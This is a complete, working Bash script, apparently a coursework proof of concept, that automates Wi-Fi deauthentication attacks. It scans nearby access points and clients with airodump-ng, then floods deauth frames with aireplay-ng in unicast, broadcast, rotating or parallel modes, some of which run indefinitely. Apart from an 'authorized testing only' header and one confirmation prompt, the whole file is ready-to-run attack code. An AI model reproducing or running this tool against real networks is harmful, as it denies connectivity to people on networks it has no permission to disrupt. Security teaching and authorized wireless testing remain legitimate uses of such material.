#!/bin/bash
#
# deauth_poc.sh
# Interactive PoC: pick a wireless interface, auto-enable monitor mode,
# scan nearby APs, pick target by number, then choose an attack mode:
#   [1] Unicast   - disconnect one specific client
#   [2] Broadcast - one frame to all clients (often ignored by modern devices)
#   [3] Rotating  - loop through ALL clients, one by one (recommended)
#   [4] Parallel  - send to ALL clients at the same time (background processes)
#
# FOR AUTHORIZED TESTING ONLY, ON NETWORKS YOU OWN OR HAVE WRITTEN PERMISSION
# TO TEST. This script is for educational coursework demonstration.
#
# Usage: sudo ./deauth_poc.sh [monitor_interface]
# If no interface is given, you'll be prompted to choose one.

set -e

if [ "$EUID" -ne 0 ]; then
    echo "Please run as root (sudo)."
    exit 1
fi

AP_SCAN_PREFIX="/tmp/deauth_poc_ap"
CLIENT_SCAN_PREFIX="/tmp/deauth_poc_clients"
AP_SCAN_TIME=10
CLIENT_SCAN_TIME=8

# Track background PIDs so cleanup can kill them
BG_PIDS=()
PARALLEL_LOGDIR=""

cleanup() {
    if [ "${#BG_PIDS[@]}" -gt 0 ]; then
        for pid in "${BG_PIDS[@]}"; do
            kill "$pid" 2>/dev/null || true
        done
    fi
    rm -f "${AP_SCAN_PREFIX}"-01.* "${CLIENT_SCAN_PREFIX}"-01.*
    if [ -n "$PARALLEL_LOGDIR" ] && [ -d "$PARALLEL_LOGDIR" ]; then
        rm -rf "$PARALLEL_LOGDIR"
    fi
}
trap cleanup EXIT

# ---------- Stage 0: pick interface ----------
RAW_IFACE="$1"

if [ -z "$RAW_IFACE" ]; then
    echo "[*] Detecting wireless interfaces ..."
    mapfile -t WIFACES < <(iwconfig 2>/dev/null | awk '
        !/no wireless extensions/ && /IEEE 802.11/ { print $1 }
    ')
    if [ "${#WIFACES[@]}" -eq 0 ]; then
        echo "[!] No wireless interfaces found."
        exit 1
    fi
    echo ""
    echo "[*] Wireless interfaces found:"
    for i in "${!WIFACES[@]}"; do
        printf "  [%d] %s\n" "$((i+1))" "${WIFACES[$i]}"
    done
    echo ""
    read -rp "Select interface to use for the attack (number): " IFACE_CHOICE
    if ! [[ "$IFACE_CHOICE" =~ ^[0-9]+$ ]] || [ "$IFACE_CHOICE" -lt 1 ] || [ "$IFACE_CHOICE" -gt "${#WIFACES[@]}" ]; then
        echo "[!] Invalid selection."
        exit 1
    fi
    RAW_IFACE="${WIFACES[$((IFACE_CHOICE-1))]}"
fi

# ---------- Stage 0b: ensure monitor mode ----------
ensure_monitor_mode() {
    local iface="$1"
    if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo "$iface"
        return 0
    fi
    echo "[*] Enabling monitor mode on $iface ..." >&2
    airmon-ng start "$iface" > /tmp/deauth_poc_airmon.log 2>&1 || true
    sleep 1
    if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo "$iface"
        return 0
    fi
    if iwconfig "${iface}mon" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo "${iface}mon"
        return 0
    fi
    echo "[!] Could not confirm monitor mode on $iface. Check /tmp/deauth_poc_airmon.log" >&2
    return 1
}

IFACE="$(ensure_monitor_mode "$RAW_IFACE")" || exit 1
echo "[*] Using $IFACE in monitor mode."

# ---------- Stage 1: scan for nearby APs ----------
echo "[*] Scanning for nearby access points for ${AP_SCAN_TIME}s ..."
rm -f "${AP_SCAN_PREFIX}"-01.csv

echo "    (live scan output below, it will auto-stop after ${AP_SCAN_TIME}s)"
timeout -k 2 "$AP_SCAN_TIME" airodump-ng -w "$AP_SCAN_PREFIX" \
    --output-format csv "$IFACE" || true

AP_CSV="${AP_SCAN_PREFIX}-01.csv"

if [ ! -f "$AP_CSV" ]; then
    echo "[!] No scan data captured. Check your interface and try again."
    exit 1
fi

# AP section of the CSV: BSSID,...,channel(col4),...,ESSID(last col)
mapfile -t AP_LINES < <(awk -F',' '
    /^Station MAC/ { exit }
    /^BSSID/ { next }
    NF > 10 {
        bssid=$1; gsub(/^[ \t]+|[ \t]+$/, "", bssid)
        chan=$4;  gsub(/^[ \t]+|[ \t]+$/, "", chan)
        essid=$14; gsub(/^[ \t]+|[ \t]+$/, "", essid)
        if (bssid != "" && essid != "") print bssid "," chan "," essid
    }
' "$AP_CSV" | sort -u -t',' -k3)

if [ "${#AP_LINES[@]}" -eq 0 ]; then
    echo "[!] No access points found."
    exit 1
fi

echo ""
echo "[*] Access points found:"
for i in "${!AP_LINES[@]}"; do
    IFS=',' read -r bssid chan essid <<< "${AP_LINES[$i]}"
    printf "  [%d] %-20s CH:%-3s %s\n" "$((i+1))" "$bssid" "$chan" "$essid"
done
echo ""

read -rp "Select target AP (number): " AP_CHOICE

if ! [[ "$AP_CHOICE" =~ ^[0-9]+$ ]] || [ "$AP_CHOICE" -lt 1 ] || [ "$AP_CHOICE" -gt "${#AP_LINES[@]}" ]; then
    echo "[!] Invalid selection."
    exit 1
fi

IFS=',' read -r TARGET_BSSID TARGET_CHANNEL TARGET_ESSID <<< "${AP_LINES[$((AP_CHOICE-1))]}"
echo "[*] Selected: $TARGET_ESSID ($TARGET_BSSID) on channel $TARGET_CHANNEL"

# ---------- Stage 1b: lock channel ----------
echo "[*] Locking $IFACE to channel $TARGET_CHANNEL ..."
iwconfig "$IFACE" channel "$TARGET_CHANNEL"

# ---------- Stage 2: choose attack mode ----------
echo ""
echo "Attack mode:"
echo "  [1] Unicast   - disconnect one specific client"
echo "  [2] Broadcast - one frame to all clients (often ignored by modern devices)"
echo "  [3] Rotating  - loop through ALL clients, one by one (recommended)"
echo "  [4] Parallel  - send to ALL clients at the same time (background processes)"
read -rp "Choose attack mode [1/2/3/4]: " ATTACK_MODE

if ! [[ "$ATTACK_MODE" =~ ^[1-4]$ ]]; then
    echo "[!] Invalid selection. Choose 1, 2, 3, or 4."
    exit 1
fi

# =====================================================================
# MODE 2: BROADCAST  (Address 1 = FF:FF:FF:FF:FF:FF, no -c flag)
# =====================================================================
if [ "$ATTACK_MODE" -eq 2 ]; then
    echo ""
    echo "[!] WARNING: Broadcast deauth will disconnect EVERY client on"
    echo "    $TARGET_ESSID ($TARGET_BSSID)."
    echo "    Only use this on networks you own or have written permission to test."
    read -rp "Are you sure? [y/N]: " CONFIRM
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        echo "[*] Aborted by user."
        exit 0
    fi

    echo ""
    read -rp "Number of deauth packets [0 = infinite, default 20]: " DEAUTH_COUNT
    DEAUTH_COUNT="${DEAUTH_COUNT:-20}"

    if ! [[ "$DEAUTH_COUNT" =~ ^[0-9]+$ ]]; then
        echo "[!] Invalid packet count. Enter a non-negative integer."
        exit 1
    fi

    echo ""
    if [ "$DEAUTH_COUNT" -eq 0 ]; then
        echo "[*] Sending INFINITE broadcast deauth via AP $TARGET_BSSID on $IFACE ..."
        echo "    Destination = FF:FF:FF:FF:FF:FF (all clients)"
        echo "    Press Ctrl+C to stop."
    else
        echo "[*] Sending $DEAUTH_COUNT broadcast deauth packets via AP $TARGET_BSSID on $IFACE ..."
        echo "    Destination = FF:FF:FF:FF:FF:FF (all clients)"
    fi

    aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$IFACE"

    echo ""
    echo "[*] Done."
    exit 0
fi

# =====================================================================
# MODES 1, 3, 4 need a client scan first
# =====================================================================
echo ""
echo "[*] Scanning for clients on $TARGET_BSSID for ${CLIENT_SCAN_TIME}s ..."
rm -f "${CLIENT_SCAN_PREFIX}"-01.csv

echo "    (live scan output below, it will auto-stop after ${CLIENT_SCAN_TIME}s)"
timeout -k 2 "$CLIENT_SCAN_TIME" airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
    -w "$CLIENT_SCAN_PREFIX" --output-format csv "$IFACE" || true

CLIENT_CSV="${CLIENT_SCAN_PREFIX}-01.csv"

if [ ! -f "$CLIENT_CSV" ]; then
    echo "[!] No scan data captured."
    exit 1
fi

mapfile -t CLIENTS < <(awk -v bssid="$TARGET_BSSID" '
    BEGIN { in_stations=0 }
    /^Station MAC/ { in_stations=1; next }
    in_stations && NF > 0 {
        split($0, f, ",")
        client_mac = f[1]
        gsub(/^[ \t]+|[ \t]+$/, "", client_mac)
        assoc_bssid = f[6]
        gsub(/^[ \t]+|[ \t]+$/, "", assoc_bssid)
        if (assoc_bssid == bssid && client_mac != "") print client_mac
    }
' "$CLIENT_CSV" | sort -u)

if [ "${#CLIENTS[@]}" -eq 0 ]; then
    echo "[!] No connected clients found on $TARGET_ESSID ($TARGET_BSSID)."
    echo "    Tip: try broadcast mode instead, or connect a device and retry."
    exit 1
fi

echo ""
echo "[*] Clients found on $TARGET_ESSID (${#CLIENTS[@]} total):"
for i in "${!CLIENTS[@]}"; do
    printf "  [%d] %s\n" "$((i+1))" "${CLIENTS[$i]}"
done

# =====================================================================
# MODE 1: UNICAST  (pick one client)
# =====================================================================
if [ "$ATTACK_MODE" -eq 1 ]; then
    echo ""
    read -rp "Select a client to deauth (number): " CLIENT_CHOICE

    if ! [[ "$CLIENT_CHOICE" =~ ^[0-9]+$ ]] || \
       [ "$CLIENT_CHOICE" -lt 1 ] || [ "$CLIENT_CHOICE" -gt "${#CLIENTS[@]}" ]; then
        echo "[!] Invalid selection."
        exit 1
    fi

    TARGET_MAC="${CLIENTS[$((CLIENT_CHOICE-1))]}"

    echo ""
    read -rp "Number of deauth packets [0 = infinite, default 20]: " DEAUTH_COUNT
    DEAUTH_COUNT="${DEAUTH_COUNT:-20}"

    if ! [[ "$DEAUTH_COUNT" =~ ^[0-9]+$ ]]; then
        echo "[!] Invalid packet count."
        exit 1
    fi

    echo ""
    if [ "$DEAUTH_COUNT" -eq 0 ]; then
        echo "[*] Sending INFINITE unicast deauth to $TARGET_MAC via AP $TARGET_BSSID ..."
        echo "    Destination = $TARGET_MAC (single client)"
        echo "    Press Ctrl+C to stop."
    else
        echo "[*] Sending $DEAUTH_COUNT unicast deauth packets to $TARGET_MAC via AP $TARGET_BSSID ..."
        echo "    Destination = $TARGET_MAC (single client)"
    fi

    aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" -c "$TARGET_MAC" "$IFACE"

    echo ""
    echo "[*] Done."
    exit 0
fi

# =====================================================================
# MODES 3 & 4: multi-client attack settings
# =====================================================================
echo ""
echo "Multi-client settings:"

read -rp "Packets per client per round [default 10]: " PKT_PER_CLIENT
PKT_PER_CLIENT="${PKT_PER_CLIENT:-10}"
if ! [[ "$PKT_PER_CLIENT" =~ ^[1-9][0-9]*$ ]]; then
    echo "[!] Invalid packet count. Must be a positive integer."
    exit 1
fi

read -rp "Duration in seconds [0 = infinite (parallel only), default 30]: " DURATION
DURATION="${DURATION:-30}"
if ! [[ "$DURATION" =~ ^[0-9]+$ ]]; then
    echo "[!] Invalid duration. Must be a non-negative integer."
    exit 1
fi

# Infinite duration only makes sense in parallel mode
if [ "$ATTACK_MODE" -eq 3 ] && [ "$DURATION" -eq 0 ]; then
    echo "[!] Infinite duration is only supported in Parallel mode (4)."
    echo "    Rotating mode needs a finite duration."
    exit 1
fi

# =====================================================================
# MODE 3: ROTATING  (loop through all clients, one by one)
# =====================================================================
if [ "$ATTACK_MODE" -eq 3 ]; then
    echo ""
    echo "[*] ROTATING mode"
    echo "    Clients:  ${#CLIENTS[@]}"
    echo "    Packets:  $PKT_PER_CLIENT per client per round"
    echo "    Duration: $DURATION seconds"
    echo "    Press Ctrl+C to stop early."
    echo ""

    END_TIME=$(( SECONDS + DURATION ))
    ROUND=0

    while [ "$SECONDS" -lt "$END_TIME" ]; do
        ROUND=$((ROUND + 1))
        echo "[*] Round $ROUND — $(date +%H:%M:%S)"

        for mac in "${CLIENTS[@]}"; do
            if [ "$SECONDS" -ge "$END_TIME" ]; then break; fi
            printf "    -> %s\n" "$mac"
            aireplay-ng --deauth "$PKT_PER_CLIENT" -a "$TARGET_BSSID" -c "$mac" "$IFACE" \
                > /dev/null 2>&1 || true
        done
    done

    echo ""
    echo "[*] Done. Sent deauth to ${#CLIENTS[@]} clients for $DURATION seconds ($ROUND rounds)."
    exit 0
fi

# =====================================================================
# MODE 4: PARALLEL  (background processes, one per client)
# =====================================================================
if [ "$ATTACK_MODE" -eq 4 ]; then
    echo ""
    echo "[*] PARALLEL mode"
    echo "    Clients:  ${#CLIENTS[@]}"
    if [ "$DURATION" -eq 0 ]; then
        echo "    Duration: INFINITE (Ctrl+C to stop)"
    else
        echo "    Duration: $DURATION seconds"
    fi
    echo "    Each client gets its own background aireplay-ng process."
    echo ""

    PARALLEL_LOGDIR="$(mktemp -d /tmp/deauth_parallel.XXXXXX)"
    echo "[*] Logs will be saved in: $PARALLEL_LOGDIR"
    echo ""

    # Launch one aireplay-ng per client in background.
    # --deauth 0 = infinite until killed.
    for mac in "${CLIENTS[@]}"; do
        LOG="$PARALLEL_LOGDIR/${mac//:/_}.log"
        aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$mac" "$IFACE" \
            > "$LOG" 2>&1 &
        pid=$!
        BG_PIDS+=("$pid")
        printf "    [%d] started -> %s\n" "$pid" "$mac"
    done

    echo ""

    # Local Ctrl+C handler: set a flag instead of exiting so the loop
    # breaks cleanly and we can kill children + keep logs.
    STOP_NOW=0
    trap 'STOP_NOW=1; echo ""; echo "[*] Caught Ctrl+C, stopping ..."' INT

    if [ "$DURATION" -eq 0 ]; then
        echo "[*] Running INFINITELY. Press Ctrl+C to stop."
        echo ""
        ELAPSED=0
        while [ "$STOP_NOW" -eq 0 ]; do
            sleep 1
            ELAPSED=$((ELAPSED + 1))
            printf "\r    running: %d seconds" "$ELAPSED"
        done
        echo ""
    else
        echo "[*] Running for $DURATION seconds ..."
        echo "    Press Ctrl+C to stop early."
        echo ""
        ELAPSED=0
        while [ "$ELAPSED" -lt "$DURATION" ] && [ "$STOP_NOW" -eq 0 ]; do
            sleep 1
            ELAPSED=$((ELAPSED + 1))
            printf "\r    %d / %d seconds" "$ELAPSED" "$DURATION"
        done
        echo ""
    fi

    # Restore default INT handling so Ctrl+C works normally after this
    trap - INT

    # Stop all background processes
    echo ""
    echo "[*] Stopping background processes ..."
    for pid in "${BG_PIDS[@]}"; do
        kill "$pid" 2>/dev/null || true
    done
    sleep 1
    for pid in "${BG_PIDS[@]}"; do
        kill -9 "$pid" 2>/dev/null || true
    done
    wait 2>/dev/null || true
    BG_PIDS=()

    echo "[*] Done."
    echo ""
    echo "[*] Per-client logs:"
    ls -1 "$PARALLEL_LOGDIR"
    echo ""
    echo "[*] Log directory: $PARALLEL_LOGDIR"
    echo "    (Note: this directory is deleted when the script exits.)"
    echo "    Copy it now if you want to keep it."
    echo ""

    read -rp "Keep logs? [y/N]: " KEEP_LOGS
    if [[ "$KEEP_LOGS" =~ ^[Yy]$ ]]; then
        DEST="$HOME/deauth_logs_$(date +%Y%m%d_%H%M%S)"
        cp -r "$PARALLEL_LOGDIR" "$DEST"
        echo "[*] Logs copied to: $DEST"
    fi

    exit 0
fi